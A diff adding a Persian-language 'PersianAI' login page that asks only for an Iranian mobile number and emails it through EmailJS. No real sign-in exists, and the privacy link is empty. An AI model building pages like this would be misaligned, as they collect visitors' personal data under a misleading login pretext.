@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>پرشین‌ای‌آی | هوش مصنوعی برای همه</title>
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700&display=swap');
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Vazirmatn', sans-serif;
+    }
+    
+    body {
+      background-color: #f8faff;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      direction: rtl;
+      background: linear-gradient(135deg, #f8faff 0%, #e2e8fd 100%);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    body::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(78, 90, 255, 0.03) 0%, rgba(78, 90, 255, 0) 70%);
+      z-index: -2;
+    }
+    
+    .login-container {
+      background-color: white;
+      border-radius: 28px;
+      box-shadow: 0 20px 60px rgba(23, 92, 230, 0.08), 0 8px 24px rgba(23, 92, 230, 0.05);
+      overflow: hidden;
+      width: 430px;
+      max-width: 90%;
+      padding: 0;
+      text-align: center;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .login-header {
+      background: linear-gradient(135deg, #4776e6 0%, #8e54e9 100%);
+      padding: 35px 30px 25px;
+      position: relative;
+      color: white;
+      overflow: hidden;
+    }
+    
+    .login-header::after {
+      content: '';
+      position: absolute;
+      bottom: -15px;
+      left: 0;
+      right: 0;
+      height: 30px;
+      background: white;
+      border-radius: 50% 50% 0 0 / 100% 100% 0 0;
+    }
+    
+    .circuit-pattern {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0.1;
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><path d="M10,30 L30,30 L30,10 M40,10 L40,40 L10,40 M50,20 L50,50 L80,50 L80,80 M70,30 L70,70 L30,70 M60,50 L60,90 L90,90" stroke="white" stroke-width="2" fill="none"/></svg>');
+      background-size: 40px 40px;
+    }
+    
+    .logo {
+      margin-bottom: 10px;
+      display: flex;
+      justify-content: center;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .login-title {
+      color: white;
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 5px;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .login-subtitle {
+      color: rgba(255, 255, 255, 0.85);
+      font-size: 15px;
+      font-weight: 400;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .login-form {
+      padding: 35px 40px 40px;
+    }
+    
+    .form-label {
+      display: block;
+      text-align: right;
+      margin-bottom: 10px;
+      color: #4e5d78;
+      font-weight: 600;
+      font-size: 15px;
+    }
+    
+    .input-group {
+      position: relative;
+      margin-bottom: 30px;
+    }
+    
+    .input-group input {
+      width: 100%;
+      padding: 18px 18px 18px 65px;
+      border: 2px solid #eef1f8;
+      border-radius: 16px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      direction: ltr;
+      text-align: left;
+      background-color: #f9faff;
+      color: #4e5d78;
+      font-weight: 500;
+    }
+    
+    .input-group input:focus {
+      border-color: #6c5ce7;
+      background-color: #fff;
+      box-shadow: 0 4px 20px rgba(108, 92, 231, 0.15);
+      outline: none;
+    }
+    
+    .input-group .prefix {
+      position: absolute;
+      left: 18px;
+      top: 18px;
+      color: #4e5d78;
+      font-weight: 600;
+      background-color: #eef1f8;
+      padding: 2px 8px;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+    
+    button {
+      background: linear-gradient(135deg, #6c5ce7 0%, #8e54e9 100%);
+      color: white;
+      border: none;
+      border-radius: 16px;
+      padding: 18px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 6px 15px rgba(108, 92, 231, 0.2);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    button::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(to right, transparent 0%, rgba(255, 255, 255, 0.2) 50%, transparent 100%);
+      transform: translateX(-100%);
+      transition: transform 0.5s ease;
+    }
+    
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 25px rgba(108, 92, 231, 0.3);
+    }
+    
+    button:hover::after {
+      transform: translateX(100%);
+    }
+    
+    .form-footer {
+      margin-top: 30px;
+      color: #7b8ab0;
+      font-size: 14px;
+    }
+    
+    .form-footer a {
+      color: #6c5ce7;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    
+    .form-footer a:hover {
+      text-decoration: underline;
+    }
+    
+    /* Farsi numbers */
+    .fa-num {
+      font-feature-settings: "ss03";
+    }
+    
+    /* Technology Dots Decoration */
+    .tech-dots {
+      position: absolute;
+      bottom: -30px;
+      right: -30px;
+      width: 180px;
+      height: 180px;
+      opacity: 0.05;
+      z-index: -1;
+      background-image: radial-gradient(circle, #4e5d78 2px, transparent 2px);
+      background-size: 15px 15px;
+      transform: rotate(-15deg);
+    }
+    
+    /* Mobile Number Formatting Guide */
+    .format-guide {
+      text-align: right;
+      font-size: 12px;
+      color: #7b8ab0;
+      margin-top: -25px;
+      margin-bottom: 25px;
+    }
+    
+    /* Loading Spinner */
+    .spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 10px;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .button-content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    /* Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.5);
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+    }
+    
+    .modal-content {
+      background-color: white;
+      padding: 30px;
+      border-radius: 20px;
+      max-width: 90%;
+      width: 400px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+    }
+    
+    .modal-title {
+      color: #4e5d78;
+      margin-bottom: 15px;
+      font-size: 20px;
+    }
+    
+    .modal-text {
+      color: #7b8ab0;
+      margin-bottom: 25px;
+    }
+    
+    .modal-button {
+      background: linear-gradient(135deg, #6c5ce7 0%, #8e54e9 100%);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      padding: 12px 24px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-header">
+      <div class="circuit-pattern"></div>
+      
+      <!-- Tech Logo -->
+      <div class="logo">
+        <svg width="75" height="75" viewBox="0 0 100 100">
+          <defs>
+            <linearGradient id="logo-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+              <stop offset="0%" stop-color="#ffffff" />
+              <stop offset="100%" stop-color="#f0f0f0" />
+            </linearGradient>
+          </defs>
+          <circle cx="50" cy="50" r="45" fill="none" stroke="url(#logo-gradient)" stroke-width="2" opacity="0.3" />
+          <circle cx="50" cy="50" r="38" fill="none" stroke="url(#logo-gradient)" stroke-width="1" opacity="0.5" />
+          
+          <!-- Hexagon Tech Symbol -->
+          <polygon points="50,23 71,35.5 71,60.5 50,73 29,60.5 29,35.5" fill="none" stroke="white" stroke-width="2" />
+          <line x1="29" y1="35.5" x2="71" y2="35.5" stroke="white" stroke-width="2" />
+          <line x1="29" y1="60.5" x2="71" y2="60.5" stroke="white" stroke-width="2" />
+          <line x1="50" y1="23" x2="50" y2="73" stroke="white" stroke-width="2" />
+          
+          <!-- Digital Connection Dots -->
+          <circle cx="29" cy="35.5" r="3" fill="white" />
+          <circle cx="29" cy="60.5" r="3" fill="white" />
+          <circle cx="50" cy="23" r="3" fill="white" />
+          <circle cx="50" cy="73" r="3" fill="white" />
+          <circle cx="71" cy="35.5" r="3" fill="white" />
+          <circle cx="71" cy="60.5" r="3" fill="white" />
+          <circle cx="50" cy="48" r="5" fill="white" />
+        </svg>
+      </div>
+      
+      <h1 class="login-title">پرشین‌ای‌آی</h1>
+      <p class="login-subtitle">هوش مصنوعی برای همه</p>
+    </div>
+    
+    <div class="login-form">
+      <form id="loginForm">
+        <label class="form-label">شماره موبایل خود را وارد کنید</label>
+        <div class="input-group">
+          <span class="prefix">+98</span>
+          <input 
+            type="tel" 
+            id="mobileNumber" 
+            placeholder="9xxxxxxxxx" 
+            pattern="^9\d{9}$" 
+            required
+            maxlength="10"
+            class="fa-num"
+          >
+        </div>
+        <p class="format-guide">مثال: 9123456789</p>
+        
+        <button type="submit">
+          <div class="button-content">
+            <div class="spinner" id="submitSpinner"></div>
+            <span>ورود</span>
+          </div>
+        </button>
+        
+        <p class="form-footer">
+          با ورود به سامانه، <a href="#">قوانین حریم خصوصی</a> را می‌پذیرید
+        </p>
+      </form>
+      
+      <div class="tech-dots"></div>
+    </div>
+  </div>
+  
+  <!-- Success Modal -->
+  <div class="modal" id="successModal">
+    <div class="modal-content">
+      <h3 class="modal-title">عملیات موفق</h3>
+      <p class="modal-text">اطلاعات شما با موفقیت ارسال شد.</p>
+      <button class="modal-button" onclick="closeModal()">بستن</button>
+    </div>
+  </div>
+
+  <script>
+    // Initialize EmailJS
+    (function() {
+      // Replace with your EmailJS user ID
+      emailjs.init("IImo9Yty4hJli10mi");
+    })();
+    
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const mobileInput = document.getElementById('mobileNumber');
+      const mobileNumber = mobileInput.value;
+      const spinner = document.getElementById('submitSpinner');
+      
+      // Validate Iranian mobile number
+      const iranianMobileRegex = /^9\d{9}$/;
+      
+      if (iranianMobileRegex.test(mobileNumber)) {
+        // Show spinner
+        spinner.style.display = 'inline-block';
+        
+        // Send mobile number with EmailJS
+        const templateParams = {
+  mobile_number: '+98' + mobileNumber,
+  phone: '+98' + mobileNumber,  // Adding an alternative parameter name
+  message: 'New mobile number submission: +98' + mobileNumber,  // Adding a clear message
+  to_email: 'YOUR_EMAIL@example.com'
+};
+        
+        emailjs.send('service_2l286du', 'template_5cy70ny', templateParams)
+          .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+            
+            // Hide spinner
+            spinner.style.display = 'none';
+            
+            // Show success modal
+            document.getElementById('successModal').style.display = 'flex';
+          }, function(error) {
+            console.log('FAILED...', error);
+            spinner.style.display = 'none';
+            alert('خطا در ارسال اطلاعات. لطفا مجددا تلاش کنید.');
+          });
+      } else {
+        alert('لطفا یک شماره موبایل معتبر ایرانی وارد کنید.');
+      }
+    });
+    
+    // Format number as user types
+    document.getElementById('mobileNumber').addEventListener('input', function(e) {
+      // Remove any non-digit characters
+      this.value = this.value.replace(/\D/g, '');
+      
+      // Ensure it starts with 9
+      if (this.value.length > 0 && this.value[0] !== '9') {
+        this.value = '9' + this.value.substring(1);
+      }
+      
+      // Limit to 10 digits (9 + 9 more digits)
+      if (this.value.length > 10) {
+        this.value = this.value.substring(0, 10);
+      }
+    });
+    
+    // Close modal
+    function closeModal() {
+      document.getElementById('successModal').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
